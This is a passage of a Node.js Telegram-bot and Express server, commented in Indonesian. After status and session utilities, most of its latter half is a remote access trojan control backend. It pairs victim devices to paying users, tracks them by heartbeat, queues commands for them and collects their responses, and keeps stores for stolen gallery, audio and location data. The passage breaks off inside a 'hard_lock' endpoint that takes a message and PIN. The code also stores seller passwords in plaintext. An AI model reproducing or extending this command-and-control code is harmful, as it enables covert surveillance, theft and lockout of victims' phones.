            cpuPercent = ((cpuTime / process.uptime()) * 100).toFixed(2);
        } else {
            const stat = execSync(`cat /proc/${pid}/stat`, { encoding: 'utf8' }).trim();
            const parts = stat.split(/\s+/);
            const utime = parseInt(parts[13]);
            const stime = parseInt(parts[14]);
            const totalTime = utime + stime;
            const uptimeSec = process.uptime();
            cpuPercent = ((totalTime / (uptimeSec * 100)) * 100).toFixed(2);
        }
        if (parseFloat(cpuPercent) > 100) cpuPercent = "100.00";
    } catch (e) {
        cpuPercent = "0.00";
    }

    // ==========================================
    // 7. NETWORK (KHUSUS PROSES NODE.JS / PANEL)
    // ==========================================
    let netRx = 0;
    let netTx = 0;
    try {
        const { execSync } = require('child_process');
        const pid = process.pid;
        if (os.platform() === 'win32') {
            netRx = "N/A"; 
            netTx = "N/A";
        } else {
            const netData = execSync(`cat /proc/${pid}/net/dev`, { encoding: 'utf8' });
            const lines = netData.trim().split('\n');
            let totalRx = 0, totalTx = 0;
            for (let i = 2; i < lines.length; i++) {
                const parts = lines[i].trim().split(/\s+/);
                if (parts.length > 9) {
                    totalRx += parseInt(parts[1]) || 0;
                    totalTx += parseInt(parts[9]) || 0;
                }
            }
            netRx = totalRx;
            netTx = totalTx;
        }
    } catch (e) {
        netRx = 0;
        netTx = 0;
    }

    const formatBytes = (bytes) => {
        if (bytes === "N/A" || bytes === 0 || isNaN(bytes)) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    };

    // 8. OS INFO
    const osType = os.type();
    const osPlatform = os.platform();
    const osRelease = os.release();
    const osHostname = os.hostname();
    const nodeVersion = process.version;
    const processId = process.pid;

    // 9. DISK (Opsional, tetap dipertahankan)
    let diskInfo = "Tidak terbaca";
    try {
        const { execSync } = require('child_process');
        if (os.platform() === 'win32') {
            const diskOutput = execSync('wmic logicaldisk get size,freespace,caption', { encoding: 'utf8' });
            const lines = diskOutput.trim().split('\n').slice(1);
            if (lines.length > 0 && lines[0].trim() !== '') {
                const parts = lines[0].trim().split(/\s+/);
                const drive = parts[0];
                const free = (parseInt(parts[1]) / 1024 / 1024 / 1024).toFixed(2);
                const total = (parseInt(parts[2]) / 1024 / 1024 / 1024).toFixed(2);
                const used = (total - free).toFixed(2);
                const diskPercent = ((used / total) * 100).toFixed(1);
                diskInfo = `${drive} Used: ${used}GB / Total: ${total}GB (${diskPercent}%)`;
            }
        } else {
            const diskOutput = execSync("df -h / | tail -1", { encoding: 'utf8' });
            const parts = diskOutput.trim().split(/\s+/);
            diskInfo = `Used: ${parts[2]} / Total: ${parts[1]} (Avail: ${parts[3]} | ${parts[4]})`;
        }
    } catch (e) { diskInfo = "Tidak terbaca"; }

    // 10. BOT INFO
    const botInfo = await bot.getMe();
    const getTime = new Date().toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' });
    const getDate = new Date().toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta', weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' });

    // VISUAL BAR
    const makeBar = (percent, length = 15) => {
        const p = parseFloat(percent);
        const filled = Math.round((p / 100) * length);
        const empty = length - filled;
        let emoji = "🟢";
        if (p > 60) emoji = "🟡";
        if (p > 85) emoji = "🔴";
        return `${emoji} [${"█".repeat(filled)}${"░".repeat(empty)}] ${percent}%`;
    };

    // ==========================================
    // FINAL TEXT MESSAGE (MIMIC JSCLOUD PANEL)
    // ==========================================
    const text = `
<b>🟢 TR4SHLIGHT SERVER STATUS</b>

<b>⏱ Network & Uptime</b>
├ Ping    : <code>${ping}ms</code> ${pingEmoji} ${pingStatus}
├ Status  : <code>Online</code>
└ Uptime  : <code>${uptime}</code>

<b>👤 User Statistics</b>
├ Total Users : <code>${totalUser}</code>
├ 👑 King      : <code>${countRole("king")}</code>
├ 🏛️ Petinggi  : <code>${countRole("petinggi")}</code>
├ 👮 Staff     : <code>${countRole("staff")}</code>
├ 🛡️ Owner     : <code>${countRole("owner")}</code>
├ ⭐ VIP       : <code>${countRole("vip")}</code>
├ 💎 Reseller  : <code>${countRole("reseller")}</code>
├ 🧑‍💻 Member    : <code>${countRole("member")}</code>
└ 📁 DB Size   : <code>${dbSize} KB</code>

<b>📱 WhatsApp Session</b>
├ 💬 Messenger      : <code>${connectedMess}</code>
├ 💼 Business       : <code>${connectedBiz}</code>
└ ☎️ Active Numbers : <code>${connectedNumbers}</code>

<b>🧠 CPU Load (Process)</b>
├ ${makeBar(cpuPercent)}
└ Usage : <code>${cpuPercent}%</code>

<b>💾 Memory (Process)</b>
├ ${makeBar(memPercent)}
├ RSS          : <code>${memRss} MiB</code>
├ Heap Used    : <code>${memHeapUsed} MiB</code>
├ Heap Total   : <code>${memHeapTotal} MiB</code>
├ External     : <code>${memExternal} MiB</code>
└ ArrayBuffers : <code>${memArrayBuffers} MiB</code>

<b>📊 Network (Process)</b>
├ Total Received : <code>${formatBytes(netRx)}</code>
└ Total Sent     : <code>${formatBytes(netTx)}</code>

<b>🖥 System Information</b>
├ OS       : <code>${osType} (${osPlatform} ${osRelease})</code>
├ Hostname : <code>${osHostname}</code>
├ Node.js  : <code>${nodeVersion}</code>
└ PID      : <code>${processId}</code>

<b>📀 Disk Storage</b>
└ ${diskInfo}

<b>🤖 Bot Info</b>
├ Name     : <b>${botInfo.first_name}</b>
├ Username : <code>@${botInfo.username}</code>
├ Time     : <code>${getTime} WIB</code>
└ Date     : <code>${getDate}</code>

<i>🛡️ Secured by TR4SHLIGHT-Secure</i>`;

    await bot.sendMessage(chatId, text, { 
      parse_mode: 'HTML',
      disable_web_page_preview: true
    });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, `⚠️ Gagal mengambil data status.\n\n<b>Error:</b> <code>${err.message}</code>`, { parse_mode: 'HTML' });
  }
});


bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const dbPath = "./database.json";
    const logPath = "logUser.txt";

    if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    // Hitung berapa kali setiap user membuat akun
    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    // Gabungkan data username, role, dan total akun dibuat
    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    // Urutkan dari yang paling banyak membuat akun
    list.sort((a, b) => b.total - a.total);

    // Format teks file
    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath); // hapus file setelah dikirim
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

// === Fitur /clearsession ===
bot.onText(/^\/?clearsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
    }

    // Hapus seluruh isi folder permenmd
    fs.rmSync(SESSION_PATH, { recursive: true, force: true });
    fs.mkdirSync(SESSION_PATH, { recursive: true }); // buat ulang folder kosong

    bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *permenmd* dikosongkan).");
    console.log("🧹 Semua session telah dihapus melalui /clearsession");
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
  }
});
// ===== HELPER UNTUK GAYA ELEGANT =====
const getTimeWIB = () => new Date().toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta', hour: '2-digit', minute: '2-digit', second: '2-digit' });
const getDateWIB = () => new Date().toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta', day: '2-digit', month: '2-digit', year: 'numeric' });
const separator = "━━━━━━━━━━━━━━━━━━━━";

function getRunningTime() {
  const uptimeSec = Math.floor(process.uptime());
  const d = Math.floor(uptimeSec / 86400);
  const h = Math.floor((uptimeSec % 86400) / 3600);
  const m = Math.floor((uptimeSec % 3600) / 60);
  const s = uptimeSec % 60;
  return `${d}d ${h}h ${m}m ${s}s`;
}

async function getSystemData() {
  let pingMs = "0ms", totalUser = 0, activeNumbers = 0, diskInfo = "N/A", speedInfo = "N/A";

  try {
    const pingStart = Date.now();
    if (typeof axios !== 'undefined') await axios.get(`http://localhost:${PORT}/ping`);
    pingMs = `${Date.now() - pingStart}ms`;
  } catch (e) { pingMs = "N/A"; }

  try {
    if (typeof fs !== 'undefined' && fs.existsSync("database.json")) {
      const users = JSON.parse(fs.readFileSync("database.json"));
      totalUser = Array.isArray(users) ? users.length : Object.keys(users).length;
    }
  } catch (e) { totalUser = 0; }

  try {
    activeNumbers = Object.keys(typeof activeConnections !== 'undefined' ? activeConnections : {}).length;
  } catch (e) { activeNumbers = 0; }

  try {
    const { execSync } = require('child_process');
    if (os.platform() === 'win32') {
      const diskOutput = execSync('wmic logicaldisk get size,freespace,caption', { encoding: 'utf8' });
      const lines = diskOutput.trim().split('\n').slice(1);
      if (lines.length > 0 && lines[0].trim() !== '') {
        const parts = lines[0].trim().split(/\s+/);
        const total = (parseInt(parts[2]) / 1024 / 1024 / 1024).toFixed(2);
        diskInfo = `${total} GB`;
      }
    } else {
      const diskOutput = execSync("df -h / | tail -1", { encoding: 'utf8' });
      const parts = diskOutput.trim().split(/\s+/);
      diskInfo = `${parts[2]} / ${parts[1]}`;
    }
  } catch (e) { diskInfo = "N/A"; }

  try {
    const cpus = os.cpus();
    const avgSpeed = cpus.reduce((acc, cpu) => acc + cpu.speed, 0) / cpus.length;
    speedInfo = `${(avgSpeed / 1000).toFixed(2)} GHz`;
  } catch (e) { speedInfo = "N/A"; }

  return { pingMs, totalUser, activeNumbers, diskInfo, speedInfo };
}

// ===== LOGIKA CLEAR SESSION (DIEKSTRAK AGAR BISA DIPAKAI BERULANG KALI) =====
function clearEmptySessions() {
  try {
    if (typeof SESSION_PATH === 'undefined' || !fs.existsSync(SESSION_PATH)) {
      return 0; 
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }
    return deletedCount;
  } catch (err) {
    console.error("❌ Error saat clear session:", err.message);
    return 0;
  }
}

function kirimStatusServer(pesan) {
  try {
    sendToGroupsUtama(pesan, { parse_mode: "HTML" }); 
  } catch (err) {
    console.error("Gagal kirim status ke Telegram:", err.message);
  }
}

// ===== COMMAND /CLEAR (MANUAL) =====
bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const deletedCount = clearEmptySessions();
  
  if (deletedCount > 0) {
    bot.sendMessage(chatId, `✅ Berhasil menghapus <b>${deletedCount}</b> folder session kosong.`, { parse_mode: 'HTML' });
    console.log(`🧹 ${deletedCount} folder session kosong dihapus secara manual.`);
  } else {
    bot.sendMessage(chatId, "✨ Tidak ada folder session kosong yang ditemukan.", { parse_mode: 'HTML' });
  }
});

// ===== COMMAND /RESTART (MANUAL + CLEAR SESSION) =====
bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const clearedManual = clearEmptySessions();
  console.log(`🧹 [Manual] ${clearedManual} folder session kosong dihapus sebelum restart.`);

  const pesanRestart = `<b>❏ SERVER RESTART</b>
 ${separator}
❍ Reason       <code>Manual restart by owner</code>
❍ Duration     <code>~5 seconds</code>
❍ Cleanning     <code>${clearedManual} sessions clear</code>
❍ Times  <code>${getTimeWIB()} WIB</code>
 ${separator}
System will be back online shortly.`;

  kirimStatusServer(pesanRestart);
  console.log("♻️ Restart manual dijalankan...");

  setTimeout(() => {
    process.exit(0);
  }, 5000);
});

// ===== Start Express Server =====
app.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://node.whoo.cata.web.id:${PORT}`);
  startUserSessions();
});

// ===== AUTO RESTART PANEL (OTOMATIS + CLEAR SESSION) =====
const RESTART_INTERVAL = 30 * 60 * 1000; // 30 menit

// 1. Kirim notifikasi SAAT SERVER BARU AKTIF
(async () => {
  setTimeout(async () => {
    const data = await getSystemData();
    
    const pesanOnline = `<b>❏ SERVER ONLINE</b>
 ${separator}
❍ Ping           <code>${data.pingMs}</code>
❍ Total User     <code>${data.totalUser}</code>
❍ Active Numbers <code>${data.activeNumbers}</code>
❍ Total Speed    <code>${data.speedInfo}</code>
❍ Total Disk     <code>${data.diskInfo}</code>
❍ Running Time   <code>${getRunningTime()}</code>
❍ Timestamp      <code>${getDateWIB()}, ${getTimeWIB()} WIB</code>
 ${separator}
All server nominal. Ready to operate.`;

    kirimStatusServer(pesanOnline);
  }, 2000); 
})();

// 2. Peringatan & Eksekusi SETIAP 30 MENIT
setInterval(() => {
  const clearedAuto = clearEmptySessions(); // PERBAIKAN BUG: Yang tadi clearedManual, diganti clearedAuto
  console.log(`🧹 [Auto] ${clearedAuto} folder session kosong dihapus sebelum restart.`);

  const pesanPeringatan = `<b>❏ SERVER RESTART</b>
 ${separator}
❍ Reason       <code>Stability maintenance</code>
❍ Duration     <code>~5 seconds</code>
❍ Cleanning     <code>${clearedAuto} sessions clear</code>
❍ Times  <code>${getTimeWIB()} WIB</code>
 ${separator}
System will restart automatically to maintain performance.`;

  kirimStatusServer(pesanPeringatan);
  console.log("♻️ Auto restarting panel...");
  
  setTimeout(() => {
    process.exit(0); 
  }, 5000); 
}, RESTART_INTERVAL);


// ===== SETUP UPLOAD & CHAT BERBASIS FILE =====
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, 'uploads/'),
    filename: (req, file, cb) => cb(null, Date.now() + path.extname(file.originalname))
});
const upload = multer({ storage, limits: { fileSize: 5000000 } });

// PENAMBAHAN: Path file database untuk chat
const CHAT_DB_PATH = path.join(__dirname, 'chat_history.json');

// Fungsi helper untuk baca/tulis file chat
function readChatFile() {
    try {
        if (!fs.existsSync(CHAT_DB_PATH)) return [];
        return JSON.parse(fs.readFileSync(CHAT_DB_PATH, 'utf-8'));
    } catch (err) {
        console.error("Gagal baca file chat:", err.message);
        return [];
    }
}

function writeChatFile(data) {
    try {
        fs.writeFileSync(CHAT_DB_PATH, JSON.stringify(data, null, 2));
    } catch (err) {
        console.error("Gagal tulis file chat:", err.message);
    }
}

// API KIRIM PESAN (Langsung tulis ke file, RAM tetap ringan)
app.post('/api/chat/kirim', (req, res) => {
    const { username, pesan, imageUrl } = req.body; 
    
    const newMsg = {
        id: Date.now().toString(),
        username: username, 
        pesan: pesan || "",
        imageUrl: imageUrl || null,
        waktu: new Date().toISOString() 
    };
    
    // Ambi data lama, tambah data baru, lalu timpa file
    const history = readChatFile();
    history.push(newMsg);
    writeChatFile(history);
    
    res.status(200).json({ success: true, data: newMsg });
});

// =======================================================
// ENDPOINT API STORAN FEE UNTUK FLUTTER (FIXED)
// =======================================================

// 1. Ambil info rekening & nominal fee
app.get("/api/seller-storan/payment-info", (req, res) => {
  const keyInfo = activeKeys[req.query.key];
  if (!keyInfo) return res.status(401).json({ error: "Unauthorized" });
  res.json(getSellerStoranPayment());
});

// 2. Terima data & 2 gambar bukti dari Flutter
app.post("/api/seller-storan/submit", 
  sellerStoranUpload.fields([
    { name: 'proof_buyer', maxCount: 1 },
    { name: 'proof_fee', maxCount: 1 }
  ]), 
  (req, res) => {
    try {
      const key = req.query.key;
      const keyInfo = activeKeys[key];
      if (!keyInfo) return res.status(401).json({ success: false, error: "Invalid session key" });

      const { role, username, password, trial_duration } = req.body;

      // Validasi teks
      if (!username || !password || !role) {
        return res.status(400).json({ success: false, error: "Data tidak lengkap" });
      }

      // Cek username di database
      const db = loadDatabase();
      if (db.find(u => u.username.toLowerCase() === username.toLowerCase())) {
        return res.status(409).json({ success: false, error: "Username sudah digunakan" });
      }

      // Ambil file yang sudah diupload multer
      // Format multer.fields menyimpan file di dalam array berdasarkan fieldname
      const proofBuyer = req.files['proof_buyer'] ? req.files['proof_buyer'][0] : null;
      const proofFee = req.files['proof_fee'] ? req.files['proof_fee'][0] : null;

      if (!proofBuyer || !proofFee) {
        return res.status(400).json({ success: false, error: "Upload 2 bukti wajib (Buyer & Fee)" });
      }

      // Simpan ke storan DB
      const storanId = 'STR-' + Date.now();
      const paymentInfo = getSellerStoranPayment();
      const items = loadSellerStorans();
      
      items[storanId] = {
        role, 
        username, 
        password, 
        trial_duration: trial_duration || 'permanent',
        submittedBy: keyInfo.username,
        submittedRole: db.find(u => u.username === keyInfo.username)?.role || 'member',
        feeAmount: paymentInfo.fee,
        proofBuyerPath: proofBuyer.path,
        proofFeePath: proofFee.path,
        status: 'pending_review',
        createdAt: new Date().toISOString()
      };
      
      saveSellerStorans(items);

      // Kirim ke Telegram
      notifySellerStoranToTelegram(storanId, items[storanId]).catch(err => {
        console.error('[STORAN] Gagal kirim TG:', err.message);
      });

      console.log(`[✅ STORAN] Diterima dari ${keyInfo.username} untuk ${username} (ID: ${storanId})`);
      
      // Kirim sukses ke Flutter
      res.status(201).json({ 
        success: true, 
        storan_id: storanId, 
        status: 'pending_review' 
      });

    } catch (error) {
      console.error('[❌ STORAN ERROR]', error);
      // PASTIKAN SELALU RETURN JSON, biar Flutter tidak kena FormatException HTML
      res.status(500).json({ success: false, error: "Server error: " + error.message });
    }
  }
);

// 3. Endpoint untuk Flutter cek status ACC/TOLAK (Polling)
app.get("/api/seller-storan/status/:id", (req, res) => {
  const keyInfo = activeKeys[req.query.key];
  if (!keyInfo) return res.status(401).json({ error: "Unauthorized" });

  const items = loadSellerStorans();
  const item = items[req.params.id];
  if (!item) return res.status(404).json({ error: "Tidak ditemukan" });

  const response = { 
    id: req.params.id, 
    status: item.status, 
    username: item.username 
  };
  
  if (item.status === 'rejected') {
    response.reject_reason = item.rejectReason || 'Ditolak';
  }

  res.json(response);
});
// API AMBIL PESAN (Baca langsung dari file)
app.get('/api/chat/history', (req, res) => {
    const history = readChatFile();
    res.status(200).json(history);
});

// API UPLOAD GAMBAR
app.post('/api/upload', upload.single('image'), (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'Tidak ada file' });
    const imageUrl = `http://darkversefahri.jserver.web.id:2000/uploads/${req.file.filename}`;
    res.status(200).json({ imageUrl });
});

// API TOTAL USER
app.get('/api/users/total', (req, res) => {
    const db = JSON.parse(fs.readFileSync(DB_PATH, 'utf-8'));
    res.status(200).json({ total: db.length });
});

app.use(express.static(path.join(__dirname, 'public')));

// ==================== DATABASE & AUTH MOCKUPS ====================
// (Jika kamu sudah punya fungsi ini di file lain, hapus blok ini)
const USERS_DB = './users.json';
const DEVICE_PERMS_DB = './device_perms.json';
if (!fs.existsSync(USERS_DB)) fs.writeFileSync(USERS_DB, '[]');
if (!fs.existsSync(DEVICE_PERMS_DB)) fs.writeFileSync(DEVICE_PERMS_DB, '{}');


// ==================== RAT FILE CONSTANTS & HELPERS ====================
const RAT_TARGETS = './rat_targets.json';
const RAT_COMMANDS = './rat_commands.json';
const RAT_RESPONSES = './rat_responses.json';
const RAT_NOTIFS = './rat_notifs.json';
const RAT_GALLERY = './rat_gallery.json';
const RAT_AUDIO = './rat_audio.json';
const RAT_LOCATIONS = './rat_locations.json';
const RAT_BATTERY = './rat_battery.json';

const RAT_LIVE = {}; // In-memory untuk live stream frames
const lockChats = {}; // In-memory untuk lock live chat

['rat_targets','rat_commands','rat_responses','rat_notifs','rat_gallery','rat_audio','rat_locations','rat_battery'].forEach(f => {
  const p = './' + f + '.json';
  if (!fs.existsSync(p)) fs.writeFileSync(p, '[]');
});

// ==================== AUTH & PERMISSIONS ====================
function isAuthenticated(req, res) {
  const key = req.headers['authorization']?.replace('Bearer ', '') || req.body?.key || req.query?.key;
  if (!key || !activeKeys[key]) return res.status(401).json({ valid: false, message: "Unauthorized" });
  return activeKeys[key];
}

function canControlDevice(username, deviceId) {
  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  if (!user) return false;
  
  // Owner/Dev bisa kontrol semua device miliknya
  if (user.role === 'member' || user.role === 'reseller' || user.role === 'vip' || user.role === 'owner' || user.role === 'staff' || user.role === 'petinggi' || user.role === 'king') {
    const targets = readRat(RAT_TARGETS);
    return targets.some(t => t.id === deviceId && t.owner === username);
  }

  // Member/Reseller: cek device_perms.json atau ratPerms
  const perms = loadDevicePerms();
  const userPerm = perms[username.toLowerCase()];
  if (userPerm && userPerm.approved) {
    if (userPerm.allDevices) return true;
    if (Array.isArray(userPerm.devices) && userPerm.devices.includes(deviceId)) return true;
  }

  // Fallback: cek ratPerms yang diset owner
  for (const owner of db.filter(u => u.role === 'member' || u.role === 'reseller' || u.role === 'vip' || u.role === 'owner' || u.role === 'staff' || u.role === 'petinggi' || u.role === 'king'))
  {
    const perm = owner.ratPerms?.[username];
    if (!perm || !perm.approved) continue;
    if (perm.allDevices) return true;
    if (Array.isArray(perm.deviceIds) && perm.deviceIds.includes(deviceId)) return true;
  }
  return false;
}

// ==================== COMMAND QUEUE HELPER ====================
function queueCommand(deviceId, command, extra = '') {
  let cmds = readRat(RAT_COMMANDS);
  cmds = cmds.filter(c => c.targetId !== deviceId);
  cmds.push({ targetId: deviceId, command, extra, timestamp: new Date() });
  saveRat(RAT_COMMANDS, cmds);
  console.log(`[CMD] ${deviceId}: ${command}`);
}

// ==================== PAIRING & AUTH ENDPOINTS ====================
app.get("/rat/pairid", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === keyInfo.username);
  if (idx === -1) return res.json({ valid: false, message: "User not found" });
  
  if (!db[idx].pairId) {
    db[idx].pairId = genPairId();
    saveDatabase(db);
  }
  res.json({ valid: true, pairId: db[idx].pairId, username: db[idx].username, role: db[idx].role });
});

app.post("/rat/grant-member", (req, res) => {
  const { ownerKey, memberUsername, deviceIds, allDevices } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== "owner") return res.status(403).json({ valid: false, message: "Only owner can grant" });
  
  const member = db.find(u => u.username === memberUsername);
  if (!member) return res.status(404).json({ valid: false, message: "Member not found" });
  
  if (!member.ratPerms) member.ratPerms = {};
  member.ratPerms[owner.username] = { approved: true, allDevices: allDevices === true, deviceIds: Array.isArray(deviceIds) ? deviceIds : [] };
  saveDatabase(db);
  res.json({ valid: true, message: `${memberUsername} berhasil diberi akses` });
});

app.post("/rat/revoke-member", (req, res) => {
  const { ownerKey, memberUsername } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== "owner") return res.status(403).json({ valid: false, message: "Only owner" });
  
  const member = db.find(u => u.username === memberUsername);
  if (member && member.ratPerms) { delete member.ratPerms[owner.username]; saveDatabase(db); }
  res.json({ valid: true, message: `Akses ${memberUsername} dicabut` });
});

app.get("/rat/my-devices", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(404).json({ valid: false });

  const targets = readRat(RAT_TARGETS);
  let allowedDevices = [];

  if (user.role === "member" || user.role === "reseller" || user.role === "vip" || user.role === "owner" || user.role === "staff" || user.role === "petinggi" || user.role === "king") {
    allowedDevices = targets.filter(t => t.owner === user.username);
  } else {
    const perms = loadDevicePerms();
    const userPerm = perms[user.username.toLowerCase()];
    if (userPerm && userPerm.approved) {
      allowedDevices = userPerm.allDevices ? targets : targets.filter(t => (userPerm.devices || []).includes(t.id));
    } else {
      for (const owner of db.filter(u => u.role === "member" || u.role === "reseller" || u.role === "vip" || u.role === "owner" || u.role === "staff" || u.role === "petinggi" || u.role === "king")) {
        const perm = owner.ratPerms?.[user.username];
        if (!perm || !perm.approved) continue;
        const ownerDevices = targets.filter(t => t.owner === owner.username);
        allowedDevices = allowedDevices.concat(perm.allDevices ? ownerDevices : ownerDevices.filter(d => (perm.deviceIds || []).includes(d.id)));
      }
    }
  }
  res.json({ valid: true, pairId: user.pairId, role: user.role, devices: allowedDevices });
});

// ==================== DEVICE REGISTRATION & HEARTBEAT ====================
app.post('/api/heartbeat/:id', (req, res) => {
  const id = req.params.id;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === id);
  if (i !== -1) {
    t[i].lastSeen = new Date();
    t[i].status = 'Online';
    if (req.body.battery) t[i].battery = req.body.battery;
    saveRat(RAT_TARGETS, t);
  }
  res.status(200).send('1');
});

app.post('/api/register-target', (req, res) => {
  const d = req.body;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === d.id);
  if (i !== -1) t[i] = { ...t[i], ...d, lastSeen: new Date() };
  else          t.push({ ...d, lastSeen: new Date() });
  saveRat(RAT_TARGETS, t);
  res.json({ status: 'ok' });
});

app.post('/api/pair-target', (req, res) => {
  const { pairId, deviceId, model, battery } = req.body;
  if (!pairId || !deviceId) return res.status(400).json({ error: 'pairId dan deviceId wajib' });
  
  let db = loadDatabase();
  let dbChanged = false;
  for (let i = 0; i < db.length; i++) {
    if (!db[i].pairId) { db[i].pairId = genPairId(); dbChanged = true; }
  }
  if (dbChanged) saveDatabase(db);
  
  const ownerIdx = db.findIndex(u => u.pairId && u.pairId.toUpperCase() === pairId.toUpperCase());
  if (ownerIdx === -1) return res.status(404).json({ error: 'PairID tidak valid' });
  
  const owner = db[ownerIdx];
  if (!owner.devices) owner.devices = [];
  if (!owner.devices.includes(deviceId)) {
    owner.devices.push(deviceId);
    db[ownerIdx] = owner;
    saveDatabase(db);
  }
  
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === deviceId);
  const dev = { id: deviceId, model: model || 'Unknown', battery: battery || '?', owner: owner.username, status: 'Online', lastSeen: new Date() };
  if (i !== -1) t[i] = { ...t[i], ...dev };
  else          t.push(dev);
  saveRat(RAT_TARGETS, t);
  console.log(`[PAIR] ${deviceId} → ${owner.username}`);
  res.json({ status: 'paired', ownerUsername: owner.username });
});

app.get('/api/list-targets', (req, res) => {
  const { owner } = req.query;
  const t = readRat(RAT_TARGETS);
  res.json(owner ? t.filter(x => x.owner === owner) : t);
});

app.delete('/api/targets/:id', (req, res) => {
  let t = readRat(RAT_TARGETS);
  t = t.filter(x => x.id !== req.params.id);
  saveRat(RAT_TARGETS, t);
  res.json({ success: true });
});

// ==================== COMMAND QUEUE CORE ====================
app.post('/api/send-command', (req, res) => {
  const { id, command, extra } = req.body;
  if (!id) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(id, command, extra || '');
  res.json({ status: 'queued' });
});

app.get('/api/get-command/:id', (req, res) => {
  let cmds = readRat(RAT_COMMANDS);
  const i = cmds.findIndex(c => c.targetId === req.params.id);
  if (i !== -1) {
    const cmd = cmds[i];
    cmds.splice(i, 1);
    saveRat(RAT_COMMANDS, cmds);
    return res.json(cmd);
  }
  res.status(204).send();
});

app.post('/api/post-response/:id', (req, res) => {
  const { cmd, data } = req.body;
  let resps = readRat(RAT_RESPONSES);
  const nr = { targetId: req.params.id, cmd, data, timestamp: new Date() };
  const i = resps.findIndex(r => r.targetId === req.params.id);
  if (i !== -1) resps[i] = nr; else resps.push(nr);
  saveRat(RAT_RESPONSES, resps);
  res.json({ status: 'ok' });
});

app.get('/api/get-response/:id', (req, res) => {
  const resps = readRat(RAT_RESPONSES);
  res.json(resps.find(r => r.targetId === req.params.id) || {});
});

// ==================== COMMAND SHORTCUTS (CLEANED) ====================
// Lock & Unlock
// ==================== COMMAND SHORTCUTS (CLEANED) ====================
// Lock & Unlock
app.get('/api/hard_lock', (req, res) => {
  const { device, message, pin } = req.query;
  if (!device) return res.status(400).json({ error: 'Device ID required' });
